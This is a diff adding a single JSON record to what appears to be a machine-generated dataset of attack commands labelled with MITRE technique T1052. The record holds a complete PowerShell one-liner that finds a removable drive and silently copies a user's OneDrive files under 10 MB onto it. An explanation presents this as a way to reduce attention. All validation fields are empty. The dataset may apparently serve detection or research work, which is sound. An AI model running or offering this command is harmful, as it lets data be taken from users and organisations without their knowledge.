@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$dl=(Get-Volume -DriveType Removable | Select -First 1 -Expand DriveLetter); $dest=\"$dl`:\\OD\"; New-Item -ItemType Directory -Force -Path $dest | Out-Null; Get-ChildItem \"$env:USERPROFILE\\OneDrive\" -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.Length -lt 10485760 } | ForEach-Object { $rel=(Resolve-Path $_.FullName).Path.Substring($env:USERPROFILE.Length); $t=Join-Path $dest $rel; New-Item -ItemType Directory -Force -Path ([IO.Path]::GetDirectoryName($t)) | Out-Null; Copy-Item -LiteralPath $_.FullName -Destination $t -Force -ErrorAction SilentlyContinue }; Write-Output \"Staged OneDrive content to removable path $dest at $(Get-Date)\" | Out-File \"$dest\\op.log\" -Append",
+  "explanation": "Copies smaller OneDrive-synced files locally to a removable drive to reduce attention and ensure all operations remain offline.",
+  "rationale_steps": [
+    "Identify removable media path",
+    "Enumerate local OneDrive files under a size threshold",
+    "Recreate directory structure and copy files to USB",
+    "Log the operation locally using Write-Output"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-a3760856-5195c7cb",
+  "source_prompt_hash": "a3760856",
+  "timestamp_utc": "2025-09-30T05:14:51.683873Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
